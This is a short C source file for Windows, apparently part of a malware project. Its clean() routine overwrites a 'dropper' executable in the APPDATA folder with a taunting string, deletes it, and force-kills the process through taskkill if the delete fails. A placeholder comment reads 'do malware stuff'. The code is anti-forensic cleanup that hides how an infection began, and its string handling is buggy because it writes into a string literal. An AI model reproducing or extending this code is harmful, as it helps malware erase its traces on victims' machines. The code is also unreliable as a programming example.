#include <windows.h>
#include <tchar.h>
#include <stdio.h>

void clean(LPCTSTR dropper_name) {
	//delete dropper
	TCHAR dropperdir[MAX_PATH];
	DWORD bwritten;
	GetEnvironmentVariable("APPDATA", dropperdir, MAX_PATH);
	SetCurrentDirectoryA(dropperdir);
	HANDLE opendropper = CreateFileA(dropper_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL overwritedropper = WriteFile(opendropper, "kicked (;", strlen("kicked (;"), &bwritten, NULL);
	CloseHandle(opendropper);
	int attemptdelete = DeleteFileA(dropper_name);
	if (attemptdelete != 0) {
		printf("Deleted dropper\n");
	}
	else {
		CHAR * cmd = "taskkill /F /T /IM ";
		strcat_s(cmd, strlen(cmd)+strlen(dropper_name)+1, dropper_name);
		system(cmd);
		DeleteFileA(dropper_name);
	}
	//do malware stuff

}

int main() {
	clean("deaddropper.exe");	

}
